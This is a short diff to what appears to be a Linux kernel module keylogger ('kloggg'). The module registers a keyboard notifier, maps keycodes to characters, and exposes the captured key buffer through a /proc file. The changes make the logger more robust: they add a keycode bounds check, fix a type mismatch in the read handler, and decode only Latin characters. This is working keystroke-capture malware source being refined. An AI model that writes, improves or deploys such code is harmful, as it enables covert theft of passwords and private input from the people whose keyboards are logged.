@@ -25,7 +25,7 @@ static ssize_t kloggg_proc_file_read(struct file *file, char __user *ubuf, size_
   if (*ppos >= datalen)
     return 0;
 
-  len = min(datalen - *ppos, count);
+  len = min((size_t)(datalen - *ppos), (size_t)count);
 
   if (copy_to_user(ubuf, keybuf + *ppos, len))
     return -EFAULT;
@@ -46,18 +46,22 @@ static struct proc_ops kloggg_fops = {
 
 static char kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
   u_short symbol;
+
+  if (keycode >= NR_KEYS)  // prevent overflow
+    return '?';
+
   if (shift_mask & (1 << KG_SHIFT)) {
     symbol = shift_map[keycode];
-  }
-  else {
+  } else {
     symbol = plain_map[keycode];
   }
 
-  char c = symbol & 0x00FF;  // strip off high bits
-  if (c < 128) /* ASCII range */
-    return c;
-  else
-    return '?';
+  // Check for normal character type
+  if (((symbol >> 8) & 0xff) == KT_LATIN) {
+    return symbol & 0xff;  // return ASCII value
+  } else {
+    return '?';  // non-ASCII or control key
+  }
 }
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
